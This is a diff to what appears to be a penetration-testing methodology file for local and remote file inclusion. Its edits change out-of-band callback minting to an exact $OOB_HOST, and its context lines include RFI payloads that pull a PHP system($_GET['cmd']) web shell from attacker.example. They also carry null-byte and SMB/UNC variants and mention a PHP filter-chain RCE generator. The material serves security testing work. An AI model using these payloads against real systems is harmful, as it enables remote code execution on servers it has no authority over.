@@ -21,7 +21,7 @@ vuln_class: lfi, rfi, path-traversal, img-traversal
 - `vigil assess kali ffuf ...` (automated traversal depth and path fuzzing — use `--technique LFI --probe-kind payload --phase consume-test --timeout 600`)
 - `vigil assess classify-payload <value> --mutations` (type the `page=`/`file=` value and generate traversal/encoding variants — see "Type the Inclusion Parameter" below)
 - `vigil assess anomaly-score <responses.jsonl>` (triage a traversal-depth fuzz sweep — rank the response population to find the depth that read the file; see "Triaging the Depth Sweep" below)
-- `vigil oob mint` / `vigil oob poll` (RFI only — mint a callback URL, point the inclusion at it, poll for the server-side fetch; see "Remote File Inclusion" below)
+- `vigil oob mint` / `vigil oob poll` (RFI only — `mint` binds the nonce under a running client's interactsh id so `poll` can correlate it; pass `--client <name>` when several clients run; point the inclusion at the EXACT host mint prints (`$OOB_HOST`), poll for the server-side fetch; see "Remote File Inclusion" below)
 - `php_filter_chain_generator.py` — PHP filter chain RCE without file write (synacktiv tool — run host-side to generate payloads, then deliver via kali exec)
 
 ## Methodology
@@ -175,15 +175,17 @@ Before serving a shell, confirm the server actually fetches an attacker URL — 
 
 ```bash
 vigil oob status --json
-vigil oob mint --technique rfi --target-url "https://target/index.php" --param page --probe-kind http
-# -> http  http://<prefix>-<token>.oob.example.com/
+vigil oob mint --client <name> --technique rfi --target-url "https://target/index.php" --param page --probe-kind http
+# → host  <prefix>-<token>.<client-id>.oob.example.com   (= $OOB_HOST)
 ```
 
+Point the inclusion at the EXACT host mint prints (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host):
+
 ```
-?page=http://<prefix>-<token>.oob.example.com/      # confirm server-side fetch (blind RFI / include-SSRF)
+?page=http://$OOB_HOST/      # confirm server-side fetch (blind RFI / include-SSRF)
 ?page=http://attacker.example/shell.txt    # shell.txt: PAYLOAD: php system($_GET['cmd'])
 ?page=http://attacker.example/shell.txt%00 # null byte to strip appended extension
-?page=\\<prefix>-<token>.oob.example.com\share\x   # SMB (Windows) — UNC fetch fires the callback even when allow_url_include is Off
+?page=\\$OOB_HOST\share\x   # SMB (Windows) — UNC fetch fires the callback even when allow_url_include is Off
 ?page=\\attacker.example\share\shell.php   # SMB (Windows, no allow_url_include needed)
 ```
 
